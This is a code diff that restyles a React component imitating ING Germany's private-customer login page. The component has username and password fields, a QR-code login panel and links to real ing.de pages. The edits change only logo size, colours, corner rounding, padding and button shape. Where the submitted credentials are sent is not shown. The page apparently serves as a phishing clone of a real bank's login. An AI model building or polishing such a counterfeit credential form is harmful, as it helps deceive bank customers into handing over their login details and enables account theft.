@@ -86,7 +86,7 @@ const ING = () => {
       <header className="bg-white" style={{ borderBottom: "1px solid #E6E6E6" }}>
         <div className="max-w-[1200px] mx-auto px-5 lg:px-10 py-5">
           <a href="https://www.ing.de" target="_blank" rel="noopener noreferrer" aria-label="ING">
-            <img src={logoAsset.url} alt="ING" className="h-[32px] lg:h-[36px] w-auto" />
+            <img src={logoAsset.url} alt="ING" className="h-[24px] lg:h-[28px] w-auto" />
           </a>
         </div>
       </header>
@@ -96,25 +96,27 @@ const ING = () => {
         <div className="max-w-[1000px] mx-auto px-4 lg:px-6 pt-6 lg:pt-10 pb-10">
           <h1
             className="mb-5 lg:mb-6"
-            style={{ color: ORANGE, fontWeight: 400, fontSize: 28, lineHeight: 1.2 }}
+            style={{ color: "#333", fontWeight: 400, fontSize: 28, lineHeight: 1.2 }}
           >
             Log-in für Privatkunden
           </h1>
+
 
           <div className="grid grid-cols-1 lg:grid-cols-2 gap-5 lg:gap-6">
             {/* Left: Credentials */}
             <section
               style={{
                 backgroundColor: CARD_BG,
-                borderRadius: 4,
-                padding: "28px 28px 32px",
+                borderRadius: 12,
+                padding: "36px 36px 40px",
               }}
             >
               <h2
-                style={{ color: ORANGE, fontWeight: 400, fontSize: 22, marginBottom: 24 }}
+                style={{ color: ORANGE, fontWeight: 400, fontSize: 26, marginBottom: 24 }}
               >
                 Anmelden mit Zugangsdaten
               </h2>
+
               <form onSubmit={handleSubmit} noValidate autoComplete="off">
                 {/* Benutzername */}
                 <div className="grid grid-cols-1 sm:grid-cols-[140px_1fr] gap-y-1 sm:gap-x-4 items-start mb-4">
@@ -137,7 +139,8 @@ const ING = () => {
                       className="ing-input w-full"
                       style={{
                         border: `1px solid ${errors.username ? ERROR_COLOR : INPUT_BORDER}`,
-                        borderRadius: 2,
+                        borderRadius: 8,
+
                         padding: "8px 10px",
                         fontSize: 16,
                         outline: "none",
@@ -188,7 +191,8 @@ const ING = () => {
                       className="ing-input w-full"
                       style={{
                         border: `1px solid ${errors.password ? ERROR_COLOR : INPUT_BORDER}`,
-                        borderRadius: 2,
+                        borderRadius: 8,
+
                         padding: "8px 10px",
                         fontSize: 16,
                         outline: "none",
@@ -236,7 +240,7 @@ const ING = () => {
                   )}
                 </div>
 
-                <div className="sm:pl-[156px]">
+                <div>
                   <button
                     type="submit"
                     disabled={submitting}
@@ -245,8 +249,8 @@ const ING = () => {
                       color: "#fff",
                       fontSize: 16,
                       fontWeight: 700,
-                      padding: "10px 24px",
-                      borderRadius: 2,
+                      padding: "10px 28px",
+                      borderRadius: 24,
                       fontFamily: "inherit",
                       cursor: submitting ? "not-allowed" : "pointer",
                       transition: "background-color .15s",
@@ -271,6 +275,7 @@ const ING = () => {
                     </a>
                   </p>
                 </div>
+
               </form>
             </section>
 
@@ -278,15 +283,16 @@ const ING = () => {
             <section
               style={{
                 backgroundColor: CARD_BG,
-                borderRadius: 4,
-                padding: "28px 28px 32px",
+                borderRadius: 12,
+                padding: "36px 36px 40px",
               }}
             >
               <h2
-                style={{ color: ORANGE, fontWeight: 400, fontSize: 22, marginBottom: 24 }}
+                style={{ color: ORANGE, fontWeight: 400, fontSize: 26, marginBottom: 24 }}
               >
                 Anmelden mit App und QR-Code
               </h2>
+
               <div className="flex flex-col sm:flex-row gap-6">
                 <div className="flex-shrink-0">
                   <div
@@ -340,7 +346,7 @@ const ING = () => {
           {/* Secondary bar */}
           <div
             className="mt-5 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5"
-            style={{ backgroundColor: CARD_BG, borderRadius: 4, padding: "22px 28px" }}
+            style={{ backgroundColor: CARD_BG, borderRadius: 12, padding: "22px 28px" }}
           >
             {[
               { title: "Neue Zugangsdaten", link: "Jetzt Zugangsdaten erstellen", href: "https://www.ing.de/kundenservice/online-banking/zugangsdaten-erstellen/" },
